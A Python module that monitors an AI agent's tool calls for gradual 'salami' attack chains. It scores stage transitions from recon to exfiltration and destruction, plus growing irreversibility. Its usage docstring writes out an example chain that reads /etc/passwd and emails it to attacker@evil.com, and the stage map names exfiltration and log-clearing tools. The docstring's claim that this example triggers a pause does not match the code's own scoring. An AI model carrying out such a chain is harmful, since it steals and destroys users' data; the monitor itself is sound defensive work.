"""Session-level risk forecasting with salami attack detection.

Tracks a rolling window of tool calls within a session and computes
three orthogonal risk signals:

1. drift_score: Jaccard distance between baseline session tools and
   the recent window (detects topic drift toward riskier tools).
2. salami_index: transition scoring through named attack stages
   (recon -> collection -> package -> exfil -> destruct -> conceal).
3. commitment_creep: slope of irreversibility scores over the window
   (detects gradual escalation).

The overall_risk is a weighted composite. When it exceeds the threshold
(default 72), downstream consumers should escalate to REQUIRE_APPROVAL.

Source attribution: attack stage machine and composite scoring from
ClawReins (MemoryRiskForecaster.ts).
"""

from __future__ import annotations

from collections import deque
from dataclasses import dataclass, field
from typing import Any


class AttackStage:
    RECON = "recon"
    COLLECTION = "collection"
    PACKAGE = "package"
    EXFIL = "exfil"
    DESTRUCT = "destruct"
    ESCALATE = "escalate"
    CONCEAL = "conceal"


_TOOL_STAGE_MAP: dict[str, str] = {
    "read_file": AttackStage.RECON,
    "list_files": AttackStage.RECON,
    "search": AttackStage.RECON,
    "web_search": AttackStage.RECON,
    "fetch_url": AttackStage.RECON,
    "get": AttackStage.RECON,
    "download": AttackStage.COLLECTION,
    "read": AttackStage.COLLECTION,
    "copy": AttackStage.COLLECTION,
    "zip": AttackStage.PACKAGE,
    "archive": AttackStage.PACKAGE,
    "compress": AttackStage.PACKAGE,
    "tar": AttackStage.PACKAGE,
    "encode": AttackStage.PACKAGE,
    "base64": AttackStage.PACKAGE,
    "send_email": AttackStage.EXFIL,
    "send_message": AttackStage.EXFIL,
    "upload": AttackStage.EXFIL,
    "post": AttackStage.EXFIL,
    "put": AttackStage.EXFIL,
    "delete": AttackStage.DESTRUCT,
    "delete_file": AttackStage.DESTRUCT,
    "rm": AttackStage.DESTRUCT,
    "remove": AttackStage.DESTRUCT,
    "drop": AttackStage.DESTRUCT,
    "truncate": AttackStage.DESTRUCT,
    "chmod": AttackStage.ESCALATE,
    "chown": AttackStage.ESCALATE,
    "sudo": AttackStage.ESCALATE,
    "grant": AttackStage.ESCALATE,
    "clear_logs": AttackStage.CONCEAL,
    "disable_logging": AttackStage.CONCEAL,
}

_TRANSITION_SCORES: dict[tuple[str, str], int] = {
    (AttackStage.RECON, AttackStage.COLLECTION): 15,
    (AttackStage.COLLECTION, AttackStage.PACKAGE): 20,
    (AttackStage.PACKAGE, AttackStage.EXFIL): 30,
    (AttackStage.COLLECTION, AttackStage.EXFIL): 25,
    (AttackStage.EXFIL, AttackStage.DESTRUCT): 25,
    (AttackStage.DESTRUCT, AttackStage.CONCEAL): 20,
    (AttackStage.RECON, AttackStage.ESCALATE): 20,
    (AttackStage.ESCALATE, AttackStage.COLLECTION): 15,
    (AttackStage.ESCALATE, AttackStage.DESTRUCT): 25,
}

_STAGE_ORDER = [
    AttackStage.RECON,
    AttackStage.COLLECTION,
    AttackStage.PACKAGE,
    AttackStage.EXFIL,
    AttackStage.DESTRUCT,
    AttackStage.ESCALATE,
    AttackStage.CONCEAL,
]


@dataclass
class _ToolEvent:
    tool: str
    stage: str | None
    irrev_score: int


@dataclass(frozen=True)
class SessionRisk:
    """Composite risk assessment for the current session state.

    Attributes:
        drift_score: 0-100, how far the session has drifted from baseline.
        salami_index: 0-100, attack chain progression score.
        commitment_creep: 0-100, slope of irreversibility escalation.
        overall_risk: weighted composite of all three signals.
        should_pause: True if overall_risk exceeds the pause threshold.
        attack_stages_seen: ordered list of attack stages observed.
    """

    drift_score: float
    salami_index: float
    commitment_creep: float
    overall_risk: float
    should_pause: bool
    attack_stages_seen: tuple[str, ...]


class SessionRiskForecaster:
    """Track multi-turn attack chains within a session.

    Usage::

        forecaster = SessionRiskForecaster()
        risk = forecaster.record("list_files", {}, irrev_score=5)
        risk = forecaster.record("download", {"path": "/etc/passwd"}, irrev_score=30)
        risk = forecaster.record("send_email", {"to": "attacker@evil.com"}, irrev_score=70)
        assert risk.should_pause  # recon -> collection -> exfil chain detected
    """

    def __init__(
        self,
        *,
        window_size: int = 10,
        pause_threshold: float = 72.0,
        drift_weight: float = 0.3,
        salami_weight: float = 0.35,
        commitment_weight: float = 0.35,
        tool_stage_map: dict[str, str] | None = None,
    ) -> None:
        self._window_size = window_size
        self._pause_threshold = pause_threshold
        self._drift_weight = drift_weight
        self._salami_weight = salami_weight
        self._commitment_weight = commitment_weight
        self._tool_stage_map = dict(_TOOL_STAGE_MAP)
        if tool_stage_map:
            self._tool_stage_map.update(tool_stage_map)

        self._events: deque[_ToolEvent] = deque(maxlen=window_size)
        self._baseline_tools: set[str] = set()
        self._stages_seen: list[str] = []
        self._salami_raw: float = 0.0

    def record(
        self,
        tool: str,
        args: dict[str, Any] | None = None,
        *,
        irrev_score: int = 30,
    ) -> SessionRisk:
        """Record a tool call and return the updated risk assessment.

        Args:
            tool: The tool name.
            args: Tool call arguments (unused currently, reserved for future pattern matching).
            irrev_score: The irreversibility score from score_irreversibility().

        Returns:
            SessionRisk with the current composite risk state.
        """
        stage = self._tool_stage_map.get(tool.lower())
        event = _ToolEvent(tool=tool.lower(), stage=stage, irrev_score=irrev_score)
        self._events.append(event)

        # First 3 events establish the baseline.
        if len(self._baseline_tools) < 3:
            self._baseline_tools.add(tool.lower())

        # Track stage transitions for salami index.
        if stage is not None:
            if self._stages_seen and self._stages_seen[-1] != stage:
                prev = self._stages_seen[-1]
                transition_score = _TRANSITION_SCORES.get((prev, stage), 0)
                self._salami_raw += transition_score
            if not self._stages_seen or self._stages_seen[-1] != stage:
                self._stages_seen.append(stage)

        return self._compute_risk()

    def _compute_risk(self) -> SessionRisk:
        drift = self._compute_drift()
        salami = min(100.0, self._salami_raw)
        commitment = self._compute_commitment_creep()

        overall = (
            self._drift_weight * drift
            + self._salami_weight * salami
            + self._commitment_weight * commitment
        )
        return SessionRisk(
            drift_score=round(drift, 2),
            salami_index=round(salami, 2),
            commitment_creep=round(commitment, 2),
            overall_risk=round(overall, 2),
            should_pause=overall >= self._pause_threshold,
            attack_stages_seen=tuple(self._stages_seen),
        )

    def _compute_drift(self) -> float:
        """Jaccard distance between baseline tools and recent window."""
        if not self._baseline_tools:
            return 0.0
        recent = {e.tool for e in self._events}
        if not recent:
            return 0.0
        union = self._baseline_tools | recent
        intersection = self._baseline_tools & recent
        if not union:
            return 0.0
        return (1.0 - len(intersection) / len(union)) * 100.0

    def _compute_commitment_creep(self) -> float:
        """Slope of irreversibility scores over the window.

        A positive slope means the session is escalating toward more
        irreversible actions. Normalized to 0-100.
        """
        scores = [e.irrev_score for e in self._events]
        n = len(scores)
        if n < 2:
            return 0.0

        # Simple linear regression slope.
        x_mean = (n - 1) / 2.0
        y_mean = sum(scores) / n
        numerator = sum((i - x_mean) * (s - y_mean) for i, s in enumerate(scores))
        denominator = sum((i - x_mean) ** 2 for i in range(n))
        if denominator == 0:
            return 0.0

        slope = numerator / denominator
        # Normalize: a slope of 10 points per step maps to 100.
        return max(0.0, min(100.0, slope * 10.0))

    def reset(self) -> None:
        """Clear all session state."""
        self._events.clear()
        self._baseline_tools.clear()
        self._stages_seen.clear()
        self._salami_raw = 0.0
